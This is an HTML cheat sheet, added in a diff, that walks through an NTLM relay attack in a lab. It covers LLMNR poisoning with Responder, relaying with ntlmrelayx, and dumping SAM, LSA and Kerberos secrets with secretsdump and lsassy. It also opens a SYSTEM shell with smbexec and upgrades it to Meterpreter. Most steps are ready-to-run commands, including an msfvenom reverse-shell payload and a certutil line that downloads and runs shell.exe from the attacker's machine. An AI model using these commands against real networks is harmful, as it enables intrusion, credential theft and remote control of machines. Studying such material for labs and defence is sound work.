@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>NTLM Relay Attack - Lab Cheat Sheet</title>
+<style>
+  @page{margin:12mm 14mm}
+  body{font-family:Arial,Helvetica,sans-serif;margin:0;padding:0;color:#2c2c2a;line-height:1.4;font-size:12px}
+  h1{font-size:19px;font-weight:500;margin:0 0 3px 0}
+  .intro{color:#5f5e5a;margin:0 0 10px 0;font-size:12px}
+  .diagram{display:block;width:100%;page-break-after:always}
+  .steps{display:block;width:100%}
+  .step{margin-bottom:26px;page-break-inside:avoid}
+  .step .label{font-weight:600;font-size:15px;margin-bottom:6px;color:#2c2c2a}
+  .step p{margin:4px 0;font-size:13px;color:#444}
+  pre{background:#e8f1fb;border:1px solid #b3cde8;border-radius:6px;padding:10px 14px;overflow-x:auto;font-size:12.5px;line-height:1.55;margin:6px 0}
+  .note{font-size:12px;color:#5f5e5a;font-style:italic;margin-top:4px}
+  .key{margin-top:32px;color:#5f5e5a;border-top:1px solid #d3d1c7;padding-top:16px;font-size:13px}
+  .divider{border:none;border-top:1px solid #e8e6df;margin:20px 0}
+  .tab{display:inline-block;padding:2px 10px;border-radius:4px;font-size:11px;font-weight:700;margin-bottom:6px;letter-spacing:0.3px}
+  .tab-1{background:#fde8e8;color:#c0392b;border:1px solid #e8b4b4}
+  .tab-2{background:#e8e0f7;color:#6c3483;border:1px solid #c5b3e8}
+  .tab-3{background:#e0f4f1;color:#1a7a6e;border:1px solid #a8ddd8}
+  .tab-4{background:#e8f4e8;color:#1e6b1e;border:1px solid #a8d8a8}
+  .keep-open{font-size:11px;color:#c0392b;font-weight:600;margin-left:8px}
+  .trigger{background:#fff0f6;border:1.5px solid #ff6eb4;border-radius:6px;padding:7px 12px;margin-top:8px;font-size:12px;color:#c2006a;font-style:italic}
+  .trigger strong{color:#c2006a;font-style:normal}
+  svg{display:block;width:100%;max-height:220mm}
+</style>
+</head>
+<body>
+
+<div class="diagram">
+<h1>NTLM Relay Attack — Cheat Sheet</h1>
+<p class="intro">Relay a captured NTLM authentication in real time to a target — no cracking needed. At each stage, multiple tools can be used. Replace &lt;placeholders&gt; with your own values.</p>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 860" role="img">
+<title>NTLM Relay attack flow with branching options</title>
+<defs>
+  <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+    <path d="M2 2L8 5L2 8" fill="none" stroke="#888780" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
+  </marker>
+  <marker id="arr-r" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+    <path d="M2 2L8 5L2 8" fill="none" stroke="#993C1D" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
+  </marker>
+  <marker id="arr-b" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+    <path d="M2 2L8 5L2 8" fill="none" stroke="#185FA5" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
+  </marker>
+  <marker id="arr-g" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+    <path d="M2 2L8 5L2 8" fill="none" stroke="#2E7D32" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
+  </marker>
+  <marker id="arr-p" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+    <path d="M2 2L8 5L2 8" fill="none" stroke="#6A1B9A" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
+  </marker>
+</defs>
+
+<!-- ── ROW 1: Check signing (wide) ── -->
+<rect x="40" y="10" width="400" height="52" rx="5" fill="#F1EFE8" stroke="#5F5E5A" stroke-width=".6"/>
+<text font-family="Arial" font-size="13" font-weight="600" fill="#444441" x="240" y="31" text-anchor="middle">① Check SMB Signing</text>
+<text font-family="Arial" font-size="11" fill="#5F5E5A" x="240" y="51" text-anchor="middle">nxc smb &lt;subnet&gt; → signing:False required</text>
+
+<!-- ↓ -->
+<line x1="240" y1="62" x2="240" y2="82" stroke="#888780" stroke-width="1.4" marker-end="url(#arr)"/>
+
+<!-- ── ROW 2: Setup (wide) ── -->
+<rect x="40" y="84" width="400" height="64" rx="5" fill="#FAECE7" stroke="#993C1D" stroke-width=".6"/>
+<text font-family="Arial" font-size="13" font-weight="600" fill="#712B13" x="240" y="105" text-anchor="middle">② Setup</text>
+<text font-family="Arial" font-size="11" fill="#993C1D" x="240" y="121" text-anchor="middle">Responder.conf → SMB=Off  HTTP=Off</text>
+<text font-family="Arial" font-size="11" fill="#993C1D" x="240" y="139" text-anchor="middle">sudo responder -I &lt;iface&gt;</text>
+
+<!-- ↓ -->
+<line x1="240" y1="148" x2="240" y2="168" stroke="#888780" stroke-width="1.4" marker-end="url(#arr)"/>
+
+<!-- ── ROW 3: Launch relay (wide) ── -->
+<rect x="40" y="170" width="400" height="64" rx="5" fill="#FAECE7" stroke="#993C1D" stroke-width=".6"/>
+<text font-family="Arial" font-size="13" font-weight="600" fill="#712B13" x="240" y="191" text-anchor="middle">③ Launch ntlmrelayx</text>
+<text font-family="Arial" font-size="11" fill="#993C1D" x="240" y="207" text-anchor="middle">impacket-ntlmrelayx -t &lt;target&gt; -smb2support -socks</text>
+<text font-family="Arial" font-size="11" fill="#993C1D" x="240" y="223" text-anchor="middle">Wait for victim → relay fires → SOCKS session opens</text>
+
+<!-- ↓ branch line down to split -->
+<line x1="240" y1="234" x2="240" y2="254" stroke="#888780" stroke-width="1.4"/>
+<!-- horizontal split -->
+<line x1="100" y1="254" x2="380" y2="254" stroke="#888780" stroke-width="1.4"/>
+<!-- left branch down -->
+<line x1="100" y1="254" x2="100" y2="274" stroke="#888780" stroke-width="1.4" marker-end="url(#arr)"/>
+<!-- middle branch down -->
+<line x1="240" y1="254" x2="240" y2="274" stroke="#888780" stroke-width="1.4" marker-end="url(#arr)"/>
+<!-- right branch down -->
+<line x1="380" y1="254" x2="380" y2="274" stroke="#888780" stroke-width="1.4" marker-end="url(#arr)"/>
+
+<!-- ── ROW 4: 3 post-exploitation tools ── -->
+<!-- Left: secretsdump -->
+<rect x="20" y="276" width="140" height="66" rx="5" fill="#E6F1FB" stroke="#185FA5" stroke-width=".6"/>
+<text font-family="Arial" font-size="12" font-weight="600" fill="#0C447C" x="90" y="296" text-anchor="middle">secretsdump</text>
+<text font-family="Arial" font-size="10" fill="#185FA5" x="90" y="312" text-anchor="middle">LSA secrets</text>
+<text font-family="Arial" font-size="10" fill="#185FA5" x="90" y="326" text-anchor="middle">SAM hashes</text>
+<text font-family="Arial" font-size="10" fill="#185FA5" x="90" y="340" text-anchor="middle">DPAPI keys</text>
+
+<!-- Middle: lsassy -->
+<rect x="170" y="276" width="140" height="66" rx="5" fill="#E6F1FB" stroke="#185FA5" stroke-width=".6"/>
+<text font-family="Arial" font-size="12" font-weight="600" fill="#0C447C" x="240" y="296" text-anchor="middle">lsassy</text>
+<text font-family="Arial" font-size="10" fill="#185FA5" x="240" y="312" text-anchor="middle">NT hashes</text>
+<text font-family="Arial" font-size="10" fill="#185FA5" x="240" y="326" text-anchor="middle">Kerberos TGTs</text>
+<text font-family="Arial" font-size="10" fill="#185FA5" x="240" y="340" text-anchor="middle">Masterkeys</text>
+
+<!-- Right: smbexec -->
+<rect x="320" y="276" width="140" height="66" rx="5" fill="#E6F1FB" stroke="#185FA5" stroke-width=".6"/>
+<text font-family="Arial" font-size="12" font-weight="600" fill="#0C447C" x="390" y="296" text-anchor="middle">smbexec</text>
+<text font-family="Arial" font-size="10" fill="#185FA5" x="390" y="312" text-anchor="middle">Remote shell</text>
+<text font-family="Arial" font-size="10" fill="#185FA5" x="390" y="326" text-anchor="middle">No binary on disk</text>
+<text font-family="Arial" font-size="10" fill="#185FA5" x="390" y="340" text-anchor="middle">→ Meterpreter</text>
+
+<!-- proxychains label above the 3 boxes -->
+<text font-family="Arial" font-size="10" fill="#5F5E5A" font-style="italic" x="240" y="270" text-anchor="middle">all via: proxychains --no-pass</text>
+
+<!-- converge lines from 3 boxes down -->
+<line x1="90" y1="342" x2="90" y2="372" stroke="#888780" stroke-width="1.4"/>
+<line x1="240" y1="342" x2="240" y2="372" stroke="#888780" stroke-width="1.4"/>
+<line x1="390" y1="342" x2="390" y2="372" stroke="#888780" stroke-width="1.4"/>
+<line x1="90" y1="372" x2="390" y2="372" stroke="#888780" stroke-width="1.4"/>
+<line x1="240" y1="372" x2="240" y2="392" stroke="#888780" stroke-width="1.4" marker-end="url(#arr)"/>
+
+<!-- ── ROW 5: Meterpreter shell (wide) ── -->
+<rect x="40" y="394" width="400" height="52" rx="5" fill="#E8F5E9" stroke="#2E7D32" stroke-width=".6"/>
+<text font-family="Arial" font-size="13" font-weight="600" fill="#1B5E20" x="240" y="415" text-anchor="middle">④ Meterpreter Shell</text>
+<text font-family="Arial" font-size="11" fill="#2E7D32" x="240" y="435" text-anchor="middle">proxychains impacket-smbexec --no-pass → payload</text>
+
+<!-- ↓ branch line down to split -->
+<line x1="240" y1="446" x2="240" y2="466" stroke="#888780" stroke-width="1.4"/>
+<!-- horizontal split for token impersonation paths -->
+<line x1="140" y1="466" x2="340" y2="466" stroke="#888780" stroke-width="1.4"/>
+<line x1="140" y1="466" x2="140" y2="486" stroke="#888780" stroke-width="1.4" marker-end="url(#arr)"/>
+<line x1="340" y1="466" x2="340" y2="486" stroke="#888780" stroke-width="1.4" marker-end="url(#arr)"/>
+
+<!-- ── ROW 6: Two token options ── -->
+<!-- Left: Delegation tokens -->
+<rect x="40" y="488" width="185" height="66" rx="5" fill="#F3E5F5" stroke="#6A1B9A" stroke-width=".6"/>
+<text font-family="Arial" font-size="12" font-weight="600" fill="#4A148C" x="132" y="508" text-anchor="middle">Delegation Tokens</text>
+<text font-family="Arial" font-size="10" fill="#6A1B9A" x="132" y="524" text-anchor="middle">use incognito</text>
+<text font-family="Arial" font-size="10" fill="#6A1B9A" x="132" y="538" text-anchor="middle">list_tokens -u</text>
+<text font-family="Arial" font-size="10" fill="#6A1B9A" x="132" y="552" text-anchor="middle">impersonate_token</text>
+
+<!-- Right: Pass-the-Ticket -->
+<rect x="255" y="488" width="185" height="66" rx="5" fill="#F3E5F5" stroke="#6A1B9A" stroke-width=".6"/>
+<text font-family="Arial" font-size="12" font-weight="600" fill="#4A148C" x="348" y="508" text-anchor="middle">Pass-the-Ticket</text>
+<text font-family="Arial" font-size="10" fill="#6A1B9A" x="348" y="524" text-anchor="middle">TGTs from lsassy</text>
+<text font-family="Arial" font-size="10" fill="#6A1B9A" x="348" y="538" text-anchor="middle">/root/.config/lsassy/</text>
+<text font-family="Arial" font-size="10" fill="#6A1B9A" x="348" y="552" text-anchor="middle">tickets/</text>
+
+<!-- converge -->
+<line x1="132" y1="554" x2="132" y2="584" stroke="#888780" stroke-width="1.4"/>
+<line x1="348" y1="554" x2="348" y2="584" stroke="#888780" stroke-width="1.4"/>
+<line x1="132" y1="584" x2="348" y2="584" stroke="#888780" stroke-width="1.4"/>
+<line x1="240" y1="584" x2="240" y2="604" stroke="#888780" stroke-width="1.4" marker-end="url(#arr)"/>
+
+<!-- ── ROW 7: Escalation (wide) ── -->
+<rect x="40" y="606" width="400" height="52" rx="5" fill="#E8F5E9" stroke="#2E7D32" stroke-width=".6"/>
+<text font-family="Arial" font-size="13" font-weight="600" fill="#1B5E20" x="240" y="627" text-anchor="middle">⑤ Full Compromise</text>
+<text font-family="Arial" font-size="11" fill="#2E7D32" x="240" y="647" text-anchor="middle">Lateral movement / privilege escalation / DA</text>
+
+<!-- ── LDAP side note ── -->
+<rect x="40" y="690" width="400" height="52" rx="5" fill="#F1EFE8" stroke="#5F5E5A" stroke-width=".6" stroke-dasharray="4,3"/>
+<text font-family="Arial" font-size="12" font-weight="600" fill="#444441" x="240" y="711" text-anchor="middle">Alternative: LDAP Relay</text>
+<text font-family="Arial" font-size="11" fill="#5F5E5A" x="240" y="731" text-anchor="middle">ntlmrelayx -t ldap://&lt;dc&gt; → ACL / delegation abuse</text>
+
+</svg>
+</div>
+
+<!-- STEPS -->
+<div class="steps">
+
+  <div class="step">
+    <div class="label">① Check SMB Signing</div>
+    <p>SMB signing must be <strong>disabled</strong> on the target. Signed packets can't be relayed.</p>
+    <span class="tab tab-3">Tab 1 · Recon</span>
+    <pre>nxc smb &lt;target-subnet&gt;/&lt;cidr&gt;</pre>
+    <p class="note">Look for <strong>signing:False</strong>. Hosts with signing:True are immune.</p>
+    <div class="trigger"><strong>Lab trigger:</strong> Nothing to trigger — just run this and note which IPs show signing:False. Those are your relay targets.</div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="step">
+    <div class="label">② Configure Responder</div>
+    <p>ntlmrelayx needs ports 445 + 80. Turn them off in Responder so there's no conflict.</p>
+    <pre>sudo nano /usr/share/responder/Responder.conf
+
+SMB = Off
+HTTP = Off</pre>
+    <p>Then start Responder (poisoning only — auth handled by ntlmrelayx):</p>
+    <span class="tab tab-1">Tab 2 · Responder <span class="keep-open">⚠ keep open!</span></span>
+    <pre>sudo responder -I &lt;interface&gt;</pre>
+    <div class="trigger"><strong>Lab trigger:</strong> On the victim machine, open File Explorer and type <code>\\fakeshare</code> in the address bar and press Enter. Windows will broadcast an LLMNR query — Responder will poison it and redirect auth to your machine.</div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="step">
+    <div class="label">③ Launch ntlmrelayx</div>
+    <p>Relay the captured auth to the target. <code>-socks</code> opens a SOCKS proxy so any tool can ride the session. <code>-of</code> saves the NetNTLM hash to a file — useful to crack offline if the relay fails.</p>
+    <span class="tab tab-2">Tab 3 · ntlmrelayx <span class="keep-open">⚠ keep open!</span></span>
+    <pre># With SOCKS + hash capture (recommended):
+impacket-ntlmrelayx -t &lt;target-ip&gt; -smb2support -socks -of netntlm.hash
+
+# Basic — auto-dumps SAM on success (no SOCKS):
+impacket-ntlmrelayx -t &lt;target-ip&gt; -smb2support</pre>
+    <p class="note">When a victim triggers an LLMNR query, ntlmrelayx relays their auth. SOCKS opens on port 1080.</p>
+    <div class="trigger"><strong>Lab trigger:</strong> Same as step ② — have the victim browse to <code>\\fakeshare</code>. You'll see ntlmrelayx print "SMBD: Received connection" and then "Adding socks connection for..." once the relay succeeds.</div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="step">
+    <div class="label">Proxychains setup</div>
+    <span class="tab tab-3">Tab 4 · Tools</span>
+    <pre>sudo nano /etc/proxychains.conf
+
+# Add at bottom:
+socks4  127.0.0.1  1080</pre>
+    <p class="note">Use strict_chain mode. All tools below run through proxychains — no password needed.</p>
+  </div>
+
+  <hr class="divider">
+
+  <div class="step">
+    <div class="label">④ Post-exploitation — pick your tool</div>
+
+    <p><strong>secretsdump</strong> — LSA secrets, SAM hashes, DPAPI keys:</p>
+    <span class="tab tab-3">Tab 4 · Tools</span>
+    <pre>proxychains impacket-secretsdump --no-pass '&lt;domain&gt;/&lt;user&gt;'@'&lt;target-ip&gt;'</pre>
+
+    <p><strong>lsassy</strong> — NT hashes + Kerberos TGTs (tickets saved to disk):</p>
+    <span class="tab tab-3">Tab 4 · Tools</span>
+    <pre>proxychains lsassy --no-pass -d &lt;domain&gt; -u &lt;user&gt; &lt;target-ip&gt;</pre>
+
+    <p><strong>smbexec</strong> — remote shell, no binary dropped:</p>
+    <span class="tab tab-3">Tab 4 · Tools</span>
+    <pre>proxychains impacket-smbexec --no-pass '&lt;domain&gt;/&lt;user&gt;'@'&lt;target-ip&gt;' -debug</pre>
+    <p class="note"><code>-debug</code> gives verbose output and runs the shell as NT AUTHORITY\SYSTEM.</p>
+    <div class="trigger"><strong>Lab trigger:</strong> No victim action needed here — you already have the SOCKS session from the relay. Just run these commands in Tab 4. If secretsdump/lsassy fail, check that the SOCKS entry is still listed in ntlmrelayx (Tab 3).</div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="step">
+    <div class="label">⑤ Shell → Meterpreter Upgrade</div>
+    <p>You have an smbexec shell — now upgrade it to Meterpreter for token impersonation.</p>
+
+    <p><strong>Option A — Web Delivery (recommended):</strong></p>
+    <span class="tab tab-4">Tab 5 · Metasploit <span class="keep-open">⚠ keep open!</span></span>
+    <pre>msfconsole
+use exploit/multi/script/web_delivery
+set target 2                         # PSH = PowerShell
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST &lt;kali-ip&gt;
+set LPORT 4444
+run
+# Copy the PowerShell one-liner it generates
+# Paste it into your smbexec shell on the victim</pre>
+
+    <p><strong>Option B — msfvenom manual payload:</strong></p>
+    <span class="tab tab-3">Tab 4 · Tools</span>
+    <pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;kali-ip&gt; LPORT=4444 -f exe -o shell.exe
+python3 -m http.server 80</pre>
+    <span class="tab tab-4">Tab 5 · Metasploit <span class="keep-open">⚠ keep open!</span></span>
+    <pre>use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST &lt;kali-ip&gt;
+set LPORT 4444
+run</pre>
+    <p class="note">Then in smbexec shell: <code>certutil -urlcache -f http://&lt;kali-ip&gt;/shell.exe C:\Windows\Temp\shell.exe &amp;&amp; C:\Windows\Temp\shell.exe</code></p>
+    <div class="trigger"><strong>Lab trigger:</strong> For Option A — once msfconsole gives you the PowerShell one-liner, paste it into your smbexec shell on the victim. You should see a Meterpreter session open in Tab 5 within a few seconds.</div>
+  </div>
+
+  <hr class="divider">
+
+  <div class="step">
+    <div class="label">⑥ Token Impersonation (Meterpreter)</div>
+    <p>From a Meterpreter session, impersonate other users whose tokens are loaded on the target.</p>
+    <span class="tab tab-4">Tab 5 · Metasploit</span>
+    <pre>meterpreter > use incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token 'DOMAIN\username'
+meterpreter > getuid          # confirm
+meterpreter > rev2self        # revert</pre>
+    <p class="note">Delegation tokens = full network auth. Impersonation tokens = local only.</p>
+    <div class="trigger"><strong>Lab trigger:</strong> No victim action needed. Run <code>list_tokens -u</code> — if you see a domain admin token listed under Delegation Tokens, you can impersonate it. Tokens appear because the victim user was logged into that machine.</div>
+
+    <p><strong>Pass-the-Ticket</strong> — use TGTs dumped by lsassy:</p>
+    <pre># Tickets at: /root/.config/lsassy/tickets/
+# Use with impacket or Rubeus for lateral movement</pre>
+  </div>
+
+  <hr class="divider">
+
+  <div class="step">
+    <div class="label">Alternative: LDAP Relay</div>
+    <p>Relay to LDAP instead of SMB — useful for ACL abuse and delegation attacks:</p>
+    <span class="tab tab-2">Tab 3 · ntlmrelayx</span>
+    <pre>impacket-ntlmrelayx -t ldap://&lt;dc-ip&gt; -smb2support</pre>
+  </div>
+
+  <div class="key">
+    <strong>Key idea:</strong> NTLM relay doesn't crack the hash — it forwards the auth handshake live.
+    The target sees a valid login from the victim. SMB signing defeats this because the attacker
+    can't forge the signature without the session key.
+  </div>
+
+</div>
+</div>
+</body>
+</html>
